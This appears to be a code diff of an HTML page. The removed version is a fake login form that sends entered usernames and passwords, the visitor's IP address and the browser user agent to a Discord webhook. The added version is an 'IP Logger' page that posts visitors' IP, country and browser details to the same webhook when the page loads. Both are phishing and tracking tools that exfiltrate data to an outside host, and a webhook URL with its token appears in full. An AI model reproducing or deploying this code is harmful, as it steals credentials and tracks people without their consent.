@@ -1,115 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Login Form</title>
-    <style>
-        body {
-            background-image: url('https://images.unsplash.com/photo-1440613908111-bc00e0e228cd');
-            background-size: cover;
-            background-repeat: no-repeat;
-            font-family: Arial, Helvetica, sans-serif;
-            text-align: center;
-        }
-
-        h2 {
-            color: white;
-            margin-top: 50px;
-        }
-
-        form {
-            display: inline-block;
-            background-color: #f2f2f2;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 10px rgba(0,0,0,0.5);
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-
-        input[type=text], input[type=password] {
-            width: 100%;
-            padding: 12px 20px;
-            margin: 8px 0;
-            display: inline-block;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-
-        button {
-            background-color: #4CAF50;
-            color: white;
-            padding: 14px 20px;
-            margin: 8px 0;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            width: 100%;
-        }
-
-        button:hover {
-            background-color: #45a049;
-        }
-
-        .registration-link {
-            color: white;
-            text-decoration: underline;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-    </style>
-</head>
-<body>
-    <h2>Login Form</h2>
-    <form onsubmit="submitForm(event)">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required>
-
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required>
-
-        <button type="submit">Login</button>
-
-        <div class="registration-link" onclick="redirectToRegistration()">Регистрация</div>
-    </form>
-
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script>
-        function submitForm(event) {
-            event.preventDefault();
-
-            var webhook_url = "https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0"; // замените на свой Discord Webhook
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
-
-            // Получение IP-адреса пользователя и информации о браузере
-            var ip_address = "";
-            var browser_info = "";
-            $.getJSON('//api.ipify.org?format=json', function(data) {
-                ip_address = data.ip;
-                browser_info = navigator.userAgent;
-            }).done(function() {
-                var request = new XMLHttpRequest();
-                request.open("POST", webhook_url);
-                request.setRequestHeader('Content-type', 'application/json');
-                var params = {
-                    username: "Login Form",
-                    avatar_url: "https://i.imgur.com/WzAMxKl.png",
-                    content: "**Username**: " + username + "\n**Password**: " + password + "\n**IP Address**: " + ip_address + "\n**Browser Info**: " + browser_info
-                };
-                request.send(JSON.stringify(params));
-
-                alert("Вы успешно вошли!");
-                document.getElementById("username").value = "";
-                document.getElementById("password").value = "";
-            });
-        }
-
-        function redirectToRegistration() {
-            window.location.href = "reg.html";
-        }
+    <title>IP Logger</title>
+    <script type="text/javascript">
+    function getIP(json) {
+        document.getElementById("ip").innerHTML = json.ip;
+        document.getElementById("country").innerHTML = json.country_name;
+        document.getElementById("browser").innerHTML = navigator.userAgent;
+        
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0");
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify({content: "IP: "+json.ip+"\nCountry: "+json.country_name+"\nBrowser Info: "+navigator.userAgent}));
+    }
     </script>
+</head>
+<body onload="getIP(json)">
+    <h1>Welcome to the IP Logger!</h1>
+    <p>Your IP address is: <span id="ip"></span></p>
+    <p>Your country is: <span id="country"></span></p>
+    <p>Your browser information is: <span id="browser"></span></p>
 </body>
 </html>
